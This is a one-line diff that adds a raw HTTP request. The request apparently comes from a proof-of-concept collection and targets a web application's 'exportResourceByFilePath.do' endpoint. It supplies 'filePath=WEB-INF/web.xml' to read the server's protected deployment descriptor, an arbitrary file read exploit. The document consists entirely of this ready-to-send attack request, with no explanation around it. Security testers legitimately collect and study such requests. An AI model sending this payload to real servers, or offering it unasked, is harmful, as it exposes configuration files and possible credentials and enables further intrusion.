@@ -1,0 +1,1 @@
+GET /manage/leaveList/exportResourceByFilePath.do?filePath=WEB-INF/web.xml HTTP/1.1
